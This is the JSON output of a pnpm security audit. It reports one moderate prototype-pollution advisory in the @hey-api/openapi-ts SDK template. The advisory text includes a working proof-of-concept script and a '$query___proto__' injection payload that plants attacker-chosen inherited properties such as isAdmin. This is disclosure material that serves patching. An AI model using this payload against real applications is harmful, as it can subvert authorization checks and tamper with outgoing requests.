COMMAND = pnpm.cmd audit --audit-level high --json
{
  "actions": [
    {
      "action": "review",
      "module": "@hey-api/openapi-ts",
      "resolves": [
        {
          "id": 1139367,
          "path": "src__frontend>@hey-api/openapi-ts",
          "dev": false,
          "optional": false,
          "bundled": false
        }
      ]
    }
  ],
  "advisories": {
    "1139367": {
      "findings": [
        {
          "version": "0.87.5",
          "paths": [
            "src__frontend>@hey-api/openapi-ts"
          ]
        }
      ],
      "found_by": null,
      "deleted": null,
      "references": "- https://github.com/hey-api/openapi-ts/security/advisories/GHSA-hhx9-57xq-r5rw\n- https://github.com/advisories/GHSA-hhx9-57xq-r5rw",
      "created": "2026-07-01T20:55:17.000Z",
      "id": 1139367,
      "npm_advisory_id": null,
      "overview": "### Summary\n\n`dist/clients/core/params.ts` in `@hey-api/openapi-ts` ships a runtime template that is copied verbatim into every generated SDK as `params.gen.ts`. When a caller passes an object argument containing an unknown key starting with a slot prefix (`$body_`, `$headers_`, `$path_`, `$query_`), the function strips the prefix and writes the remainder directly to that slot without validation. The key `\"$query___proto__\"` causes the returned `params.query` object to have its prototype chain substituted with attacker-controlled data. The issue is present in all versions through at least `0.97.2`.\n\n### Details\n\nThe vulnerable branch in `dist/clients/core/params.ts`:\n\n```typescript\nconst extra = extraPrefixes.find(([prefix]) => key.startsWith(prefix))\nif (extra) {\n  const [prefix, slot] = extra\n  ;(params[slot] as Record<string, unknown>)[key.slice(prefix.length)] = value\n}\n```\n\nThis branch runs for any key that (1) is not registered in the field map and (2) starts with one of the four slot prefixes. When a caller passes `\"$query___proto__\"` as an extra key alongside a legitimate field, the key is not in the field map, `key.startsWith(\"$query_\")` is true, and `key.slice(7)` produces `\"__proto__\"`. The bracket-write `params[\"query\"][\"__proto__\"] = value` invokes the `__proto__` setter, which calls `Object.setPrototypeOf(params.query, value)`.\n\n**Reachability.** Every generated endpoint method that accepts an object argument passes it through `buildClientParams`. If the application forwards user-supplied request parameters to a generated client method — a common pattern in proxy servers, BFF layers, and API gateways — an attacker can include `\"$query___proto__\"` alongside a legitimate field (e.g. `\"q\"`). The legitimate field ensures `stripEmptySlots` does not remove the affected slot (it has at least one own key), so the poisoned `params.query` object is returned to the caller.\n\nConcrete field config that hey-api generates for a GET endpoint with one query param `q`:\n\n```typescript\n// generated by hey-api for: GET /search?q=<string>\nbuildClientParams([parameters], [{ args: [{ in: \"query\", key: \"q\" }] }])\n```\n\nA request `{ q: \"hello\", \"$query___proto__\": { isAdmin: true } }` reaches this call with `\"q\"` going to the field map branch and `\"$query___proto__\"` falling through to `extraPrefixes`.\n\n### PoC\n\n```bash\nnpm install @hey-api/openapi-ts@0.97.2\ncp node_modules/@hey-api/openapi-ts/dist/clients/core/params.ts ./params.ts\nnpx tsx poc.ts\n# or: docker build -t heyapi-poc . && docker run --rm heyapi-poc\n```\n\n`poc.ts`:\n\n```typescript\nimport { buildClientParams } from \"./params.ts\";\n\n// Generated fields config for GET /search?q=<string>\nconst generatedFields = [{ args: [{ in: \"query\" as const, key: \"q\" }] }];\n\n// Attacker request: legitimate \"q\" plus injected \"$query___proto__\"\nconst result = buildClientParams(\n  [{ q: \"hello\", \"$query___proto__\": { isAdmin: true } }],\n  generatedFields\n);\n\nconst q = result.query as any;\nconsole.log(q.q);                           // \"hello\" — own property, normal\nconsole.log(q.isAdmin);                     // true — inherited via prototype chain\nconsole.log(Object.keys(q));               // [\"q\"] — own keys only\nfor (const k in result.query) console.log(k); // \"q\", \"isAdmin\"\n```\n\nExpected output:\n\n```\n[CONFIRMED] buildClientParams prototype substitution via $query___proto__ key\n  Scenario: GET /search with fields [{ in:'query', key:'q' }]\n  Attacker request: { q: 'hello', '$query___proto__': { isAdmin: true } }\n\n  result.query.q         = hello\n  result.query.isAdmin   = true  ← inherited, NOT own\n  Object.keys(q)         = [ 'q' ]\n  for..in keys           = q, isAdmin\n  Object.getPrototypeOf  = {\"isAdmin\":true}\n```\n\nNo sentinel key is needed. The legitimate field `\"q\"` keeps `params.query` alive through `stripEmptySlots`.\n[reproduce.zip](https://github.com/user-attachments/files/27953600/reproduce.zip)\n\n\n\n### Impact\n\nThe returned `params.query` object has its prototype chain substituted with the attacker-supplied value. Any downstream code that iterates it with `for..in` (e.g., when serializing query parameters for an outgoing HTTP request) will enumerate the injected keys alongside legitimate ones. Applications that check inherited properties on the params object for routing or authorization decisions are also affected.\n\nGlobal `Object.prototype` is not modified — impact is limited to the returned slot object and its consumers.\n\nEvery npm package generated by `@hey-api/openapi-ts` carries this template. Downstream packages include `@opencode-ai/sdk`, `@trigger.dev/sdk`, and others. A fix in the template propagates to all of them on regeneration.",
      "reported_by": null,
      "title": "@hey-api/openapi-ts's `buildClientParams` template: prototype chain substitution via unknown `$<slot>___proto__` key",
      "metadata": null,
      "cves": [
        "CVE-2026-48819"
      ],
      "access": "public",
      "severity": "moderate",
      "module_name": "@hey-api/openapi-ts",
      "vulnerable_versions": "<0.97.3",
      "github_advisory_id": "GHSA-hhx9-57xq-r5rw",
      "recommendation": "Upgrade to version 0.97.3 or later",
      "patched_versions": ">=0.97.3",
      "updated": "2026-08-12T20:31:32.000Z",
      "cvss": {
        "score": 4.8,
        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:N"
      },
      "cwe": [
        "CWE-1321"
      ],
      "url": "https://github.com/advisories/GHSA-hhx9-57xq-r5rw"
    }
  },
  "muted": [],
  "metadata": {
    "vulnerabilities": {
      "info": 0,
      "low": 0,
      "moderate": 1,
      "high": 0,
      "critical": 0
    },
    "dependencies": 195,
    "devDependencies": 0,
    "optionalDependencies": 0,
    "totalDependencies": 195
  }
}

EXIT_CODE = 1
